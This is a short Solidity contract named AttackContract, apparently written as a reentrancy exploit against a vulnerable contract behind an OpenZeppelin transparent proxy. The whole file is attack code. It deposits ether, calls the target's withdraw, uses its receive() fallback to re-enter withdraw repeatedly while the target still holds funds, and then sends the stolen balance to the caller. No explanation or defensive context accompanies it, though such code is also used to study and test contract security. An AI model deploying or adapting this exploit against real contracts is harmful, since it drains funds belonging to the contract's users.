// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

contract AttackContract {
    TransparentUpgradeableProxy public vulnerableContract;

    constructor(TransparentUpgradeableProxy _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    function deposit() public payable {
        (bool success,) = address(vulnerableContract).call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");
    }

    function attack(uint256 amount) public payable {
        (bool success,) = address(vulnerableContract).call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success, "Withdraw failed");
    }

    function withdrawAll() public {
        // send all the funds of this contract to the msg.sender
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(vulnerableContract).balance >= msg.value) {
            attack(1 ether);
        }
    }
}
